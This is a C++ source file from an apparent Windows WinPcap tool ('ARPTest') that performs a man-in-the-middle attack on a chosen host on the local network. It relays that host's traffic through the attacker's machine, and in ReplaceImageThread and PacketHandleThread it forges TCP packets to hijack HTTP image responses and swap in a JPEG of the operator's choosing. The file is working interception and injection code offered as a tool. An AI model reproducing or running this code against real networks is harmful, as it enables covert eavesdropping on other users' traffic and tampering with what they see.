#include "stdafx.h"
#include "ARPTestDlg.h"
#include "global.h"


pcap_if_t* g_deviceList = NULL;
pcap_if_t* g_adapter = NULL;
DWORD g_selfIp = 0;
BYTE g_selfMac[6] = {};
DWORD g_selfGateway = 0;
BYTE g_gatewayMac[6] = {};

map<DWORD, BYTE[6]> g_host;


BOOL inputIp(LPCSTR src, DWORD& dest)
{
	DWORD ip[4];
	if (sscanf_s(src, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]) != 4)
		return FALSE;
	BYTE* bDest = (BYTE*)&dest;
	bDest[0] = (BYTE)ip[0];
	bDest[1] = (BYTE)ip[1];
	bDest[2] = (BYTE)ip[2];
	bDest[3] = (BYTE)ip[3];
	return TRUE;
}

BOOL GetAdapterHandle(pcap_t*& adapter)
{
	if (g_adapter == NULL)
		return FALSE;
	// open adapter
	char errBuf[PCAP_ERRBUF_SIZE];
	if ((adapter = pcap_open_live(g_adapter->name, 65536, 1, 1000, errBuf)) == NULL)
	{
		MessageBox(NULL, "Error in pcap_open_live: " + CString(g_adapter->name) + " is not supported by WinPcap", "", MB_ICONERROR);
		return FALSE;
	}
	return TRUE;
}


struct HttpImageLink
{
	WORD sourcePort;
	BYTE* initPacket;
	DWORD initPacketLen;
};
static map<WORD, HttpImageLink> g_httpImageLink; // target port -> HttpImageLink
static CCriticalSection g_httpImageLinkLock;
static BYTE* g_imageData = NULL;
static CCriticalSection g_imageDataLock;
static DWORD g_imageDataLen;

static UINT AFX_CDECL ReplaceImageThread(LPVOID _targetPort)
{
	CARPTestDlg* thiz = (CARPTestDlg*)AfxGetApp()->m_pMainWnd;
	pcap_t* adapter;
	if (!GetAdapterHandle(adapter))
		return 0;

	// get infomation
	DWORD targetIp = (DWORD)thiz->m_hostList.GetItemDataPtr(thiz->m_hostList.GetCurSel());
	BYTE targetMac[6];
	MoveMemory(targetMac, g_host[targetIp], 6);
	WORD targetPort = (WORD)_targetPort;
	g_httpImageLinkLock.Lock();
	HttpImageLink& link = g_httpImageLink[targetPort];
	g_httpImageLinkLock.Unlock();
	IPPacket* pInitIp = (IPPacket*)&link.initPacket[ETH_LENGTH];
	DWORD ipLen = pInitIp->headerLen * 4;
	TCPPacket* pInitTcp = (TCPPacket*)&link.initPacket[ETH_LENGTH + ipLen];
	DWORD tcpLen = pInitTcp->headerLen * 4;


	// receive image
	{
	BYTE* ackPkt = new BYTE[ETH_LENGTH + /*sizeof(IPPacket) + sizeof(TCPPacket)*/ipLen + tcpLen];
	MoveMemory(ackPkt, g_gatewayMac, 6);
	MoveMemory(ackPkt + 6, g_selfMac, 6);
	MoveMemory(ackPkt + 12, link.initPacket + 12, 2 + ipLen + tcpLen);
	IPPacket* pPktIp = (IPPacket*)(ackPkt + ETH_LENGTH);
	pPktIp->identification = htons(ntohs(pPktIp->identification) + 1);
	pPktIp->totalLen = htons((WORD)(ipLen + tcpLen));
	pPktIp->timeToLive = 64;
	pPktIp->sourceIp = targetIp;
	pPktIp->destinationIp = pInitIp->sourceIp;
	pPktIp->CalcCheckSum();
	TCPPacket* pPktTcp = (TCPPacket*)(ackPkt + ETH_LENGTH + ipLen);
	pPktTcp->sourcePort = targetPort;
	pPktTcp->destinationPort = pInitTcp->sourcePort;
	pPktTcp->seq = pInitTcp->ack;
	pPktTcp->ack = htonl(ntohl(pInitTcp->seq) + (link.initPacketLen - ETH_LENGTH - ipLen - tcpLen));
	pPktTcp->psh = 0;
	pPktTcp->CalcCheckSum(pPktIp->sourceIp, pPktIp->destinationIp, (WORD)tcpLen);
	pcap_sendpacket(adapter, (u_char*)ackPkt, ETH_LENGTH + sizeof(IPPacket) + sizeof(TCPPacket));

	ULONG netmask = 0x00FFFFFF;
	if (g_adapter->addresses != NULL)
		netmask = ((sockaddr_in*)g_adapter->addresses->netmask)->sin_addr.S_un.S_addr;
	CString exp;
	exp.Format("ip and tcp dst port %u", ntohs(targetPort));
	bpf_program fcode;
	pcap_compile(adapter, &fcode, exp, 1, netmask);
	pcap_setfilter(adapter, &fcode);
	DWORD time = GetTickCount();
	pcap_pkthdr* header;
	const BYTE* pkt_data;
	int res;
	DWORD lastAck = ntohl(pPktTcp->ack);
	while ((res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0 && GetTickCount() - time < 5000)
	{
		if (res == 0) // timeout
			continue;
		IPPacket* pCurIp = (IPPacket*)&pkt_data[ETH_LENGTH];
		DWORD curIpLength = pCurIp->headerLen * 4;
		TCPPacket* pCurTcp = (TCPPacket*)&pkt_data[ETH_LENGTH + curIpLength];
		DWORD curTcpLength = pCurTcp->headerLen * 4;

		pPktIp->identification = htons(ntohs(pPktIp->identification) + 1);
		pPktIp->CalcCheckSum();
		DWORD ack = ntohl(pCurTcp->seq) + (header->len - ETH_LENGTH - curIpLength - curTcpLength);
		if (lastAck < ack)
			lastAck = ack;
		pPktTcp->ack = htonl(lastAck);
		pPktTcp->CalcCheckSum(pPktIp->sourceIp, pPktIp->destinationIp, sizeof(TCPPacket));
		pcap_sendpacket(adapter, (u_char*)ackPkt, ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
		if (pCurTcp->psh)
			break;
	}
	delete ackPkt;
	}


	// send image
	DWORD sendBufLen = link.initPacketLen > 1000 ? link.initPacketLen : 1000;
	BYTE* sendBuf = new BYTE[sendBufLen];

	// send HTTP header in the initial packet
#pragma region InitPacket
	LPCSTR pHttp = (LPCSTR)&link.initPacket[ETH_LENGTH + ipLen + tcpLen];
	LPCSTR pContentType = strstr(pHttp, "Content-Type: image/");
	LPCSTR pContentLen = strstr(pHttp, "Content-Length: ") + strlen("Content-Length: ");
	DWORD httpHeaderLen = strstr(pHttp, "\r\n\r\n") + strlen("\r\n\r\n") - pHttp;

	MoveMemory(sendBuf, targetMac, 6);					// destination MAC
	MoveMemory(&sendBuf[6], g_selfMac, 6);				// source MAC

	BYTE* p1 = sendBuf + 12;
	const BYTE* p2 = link.initPacket + 12;
	DWORD len;
	if (pContentType < pContentLen)
	{
		len = 2 + ipLen + tcpLen + (pContentType - pHttp);
		MoveMemory(p1, p2, len);							// data
		p1 += len; p2 += len;

		len = strlen("Content-Type: image/jpeg");
		MoveMemory(p1, "Content-Type: image/jpeg", len);	// content type
		p1 += len; p2 = (BYTE*)strstr((LPCSTR)p2, "\r");

		len = (BYTE*)pContentLen - p2;
		MoveMemory(p1, p2, len);							// data
		p1 += len; p2 += len;

		_itoa_s(g_imageDataLen, (LPSTR)p1, 15, 10);			// content length
		for (; *(LPCSTR)p1 != '\0'; p1++); p2 = (BYTE*)strstr((LPCSTR)p2, "\r");
	}
	else
	{
		len = 2 + ipLen + tcpLen + (pContentLen - pHttp);
		MoveMemory(p1, p2, len);							// data
		p1 += len; p2 += len;

		_itoa_s(g_imageDataLen, (LPSTR)p1, 15, 10);			// content length
		for (; *(LPCSTR)p1 != '\0'; p1++); p2 = (BYTE*)strstr((LPCSTR)p2, "\r");

		len = (BYTE*)pContentType - p2;
		MoveMemory(p1, p2, len);							// data
		p1 += len; p2 += len;

		len = strlen("Content-Type: image/jpeg");
		MoveMemory(p1, "Content-Type: image/jpeg", len);	// content type
		p1 += len; p2 = (BYTE*)strstr((LPCSTR)p2, "\r");
	}

	len = (BYTE*)pHttp + httpHeaderLen - p2;
	MoveMemory(p1, p2, len);								// data
	p1 += len;


	DWORD totalLen = p1 - sendBuf;
	IPPacket* pIp = (IPPacket*)&sendBuf[ETH_LENGTH];
	pIp->totalLen = htons((u_short)(totalLen - ETH_LENGTH));		// IP total length
	pIp->CalcCheckSum();											// IP checksum
	TCPPacket* pTcp = (TCPPacket*)&sendBuf[ETH_LENGTH + ipLen];
	pTcp->psh = 0;
	pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, p1 - (BYTE*)pTcp); // TCP checksum

	pcap_sendpacket(adapter, (u_char*)sendBuf, totalLen);
	pTcp->seq = htonl(ntohl(pTcp->seq) + (totalLen - ETH_LENGTH - ipLen - tcpLen));
#pragma endregion

	// send image
	BYTE* pTcpData = (BYTE*)pTcp + tcpLen;
	DWORD maxTcpDataLen = sendBuf + sendBufLen - pTcpData;
	pIp->totalLen = htons((u_short)(sendBufLen - ETH_LENGTH));		// IP total length
	pIp->CalcCheckSum();											// IP checksum
	DWORD start;
	for (start = 0; start + maxTcpDataLen < g_imageDataLen - 1; start += maxTcpDataLen)
	{
		g_imageDataLock.Lock();
		if (g_imageData == NULL)
		{
			g_imageDataLock.Unlock();
			goto End;
		}
		MoveMemory(pTcpData, (BYTE*)&g_imageData[start], maxTcpDataLen);
		g_imageDataLock.Unlock();
		pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + maxTcpDataLen)); // TCP checksum
		pcap_sendpacket(adapter, (u_char*)sendBuf, sendBufLen);
		pTcp->seq = htonl(ntohl(pTcp->seq) + maxTcpDataLen);
	}

	// last packet
	DWORD lastTcpDataLen = g_imageDataLen - start;
	g_imageDataLock.Lock();
	if (g_imageData == NULL)
	{
		g_imageDataLock.Unlock();
		goto End;
	}
	MoveMemory(pTcpData, &g_imageData[start], lastTcpDataLen);
	g_imageDataLock.Unlock();
	pIp->totalLen = htons((u_short)(ipLen + tcpLen + lastTcpDataLen));				// IP total length
	pIp->CalcCheckSum();															// IP checksum
	pTcp->psh = 1;
	pTcp->fin = 1;
	pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + lastTcpDataLen)); // TCP checksum
	pcap_sendpacket(adapter, (u_char*)sendBuf, ETH_LENGTH + ntohs(pIp->totalLen));


	// release
End:
	delete link.initPacket;
	delete sendBuf;
	pcap_close(adapter);
	g_httpImageLinkLock.Lock();
	g_httpImageLink.erase(targetPort);
	g_httpImageLinkLock.Unlock();
	return 0;
}

UINT AFX_CDECL PacketHandleThread(LPVOID flag)
{
	CARPTestDlg* thiz = (CARPTestDlg*)AfxGetApp()->m_pMainWnd;
	pcap_t* adapter;
	if (!GetAdapterHandle(adapter))
		return 0;

	// get infomation
	DWORD targetIp = (DWORD)thiz->m_hostList.GetItemDataPtr(thiz->m_hostList.GetCurSel());
	BYTE targetMac[6], gatewayMac[6];
	MoveMemory(targetMac, g_host[targetIp], 6);
	MoveMemory(gatewayMac, g_gatewayMac, 6);

	// read image
	CString imagePath;
	thiz->m_imagePathEdit.GetWindowText(imagePath);
	if (imagePath != "")
	{
		CFile f;
		if (f.Open(imagePath, CFile::modeRead | CFile::typeBinary))
		{
			g_imageDataLen = (DWORD)f.GetLength();
			g_imageData = new BYTE[g_imageDataLen];
			f.Read((BYTE*)g_imageData, g_imageDataLen);
		}
		else
			MessageBox(NULL, "Failed to load the image.", "", MB_OK);
	}

	// start capture
	ULONG netmask = 0x00FFFFFF;
	if (g_adapter->addresses != NULL)
		netmask = ((sockaddr_in*)g_adapter->addresses->netmask)->sin_addr.S_un.S_addr;
	CString exp;
	BYTE* bIp = (BYTE*)&targetIp;
	exp.Format("ip host %u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
	bpf_program fcode;
	pcap_compile(adapter, &fcode, exp, 1, netmask);
	pcap_setfilter(adapter, &fcode);
	pcap_pkthdr* header;
	const BYTE* pkt_data;
	int res;
	DWORD send = 0, receive = 0;
	while (*(BOOL*)flag && (res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0)
	{
		if (res == 0) // timeout
			continue;
		if (memcmp(pkt_data + 6, targetMac, 6) == 0) // is target packet
#pragma region
		{
			CString status;
			status.Format("send %u, receive %u", ++send, receive);
			thiz->m_statusStatic.SetWindowText(status);

			if (thiz->m_forwardCheck.GetCheck())
			{
				// check if is replacing
				IPPacket* pIp = (IPPacket*)&pkt_data[ETH_LENGTH];
				if (pIp->protocol == PROTOCOL_TCP)
				{
					TCPPacket* pTcp = (TCPPacket*)&pkt_data[ETH_LENGTH + pIp->headerLen * 4];
					g_httpImageLinkLock.Lock();
					if (g_httpImageLink.find(pTcp->sourcePort) != g_httpImageLink.end())
					{
						g_httpImageLinkLock.Unlock();
						continue;
					}
					g_httpImageLinkLock.Unlock();
				}

				//Sleep(5);
				BYTE* newData = new BYTE[header->len];
				MoveMemory(newData, gatewayMac, 6); // destination MAC
				MoveMemory(&newData[6], g_selfMac, 6); // source MAC
				MoveMemory(&newData[12], &pkt_data[12], header->len - 12); // data
				pcap_sendpacket(adapter, (u_char*)newData, header->len);
				delete newData;
			}
		}
#pragma endregion
		else if (memcmp(pkt_data + 6, g_gatewayMac, 6) == 0 // is gateway packet
			&& *(WORD*)&pkt_data[12] == PROTOCOL_IP) // IP
#pragma region
		{
			CString status;
			status.Format("send %u, receive %u", send, ++receive);
			thiz->m_statusStatic.SetWindowText(status);

			IPPacket* pIp = (IPPacket*)&pkt_data[ETH_LENGTH];
			if (pIp->protocol == PROTOCOL_TCP) // TCP
			{
				// no replacing
				if (!thiz->m_replaceImagesCheck.GetCheck() || g_imageData == NULL)
					goto Forward;

				DWORD ipLength = pIp->headerLen * 4;
				TCPPacket* pTcp = (TCPPacket*)&pkt_data[ETH_LENGTH + ipLength];
				// is replacing
				g_httpImageLinkLock.Lock();
				if (g_httpImageLink.find(pTcp->destinationPort) != g_httpImageLink.end())
				{
					g_httpImageLinkLock.Unlock();
					continue;
				}
				g_httpImageLinkLock.Unlock();

				DWORD tcpLength = pTcp->headerLen * 4;
				// not HTTP
				if (strncmp((LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength], "HTTP/1.", strlen("HTTP/1.")) != 0)
					goto Forward;

				LPCSTR http = (LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength];
				LPCSTR contentType = strstr(http, "Content-Type: image/");
				// not image
				if (contentType == NULL)
					goto Forward;

				
				// replace image
				g_httpImageLinkLock.Lock();
				HttpImageLink& link = g_httpImageLink[pTcp->destinationPort];
				g_httpImageLinkLock.Unlock();
				link.sourcePort = pTcp->sourcePort;
				link.initPacketLen = header->len;
				link.initPacket = new BYTE[header->len];
				MoveMemory(link.initPacket, pkt_data, header->len);
				AfxBeginThread(ReplaceImageThread, (LPVOID)pTcp->destinationPort);
				continue;
			}
			
Forward:
			if (thiz->m_forwardCheck.GetCheck())
			{
				BYTE* newData = new BYTE[header->len];
				MoveMemory(newData, targetMac, 6); // destination MAC
				MoveMemory(&newData[6], g_selfMac, 6); // source MAC
				MoveMemory(&newData[12], &pkt_data[12], header->len - 12); // data
				pcap_sendpacket(adapter, (u_char*)newData, header->len);
				delete newData;
			}
		}
#pragma endregion
	}

	// release
	g_imageDataLock.Lock();
	if (g_imageData != NULL)
	{
		delete g_imageData;
		g_imageData = NULL;
	}
	g_imageDataLock.Unlock();
	pcap_close(adapter);
	return 0;
}
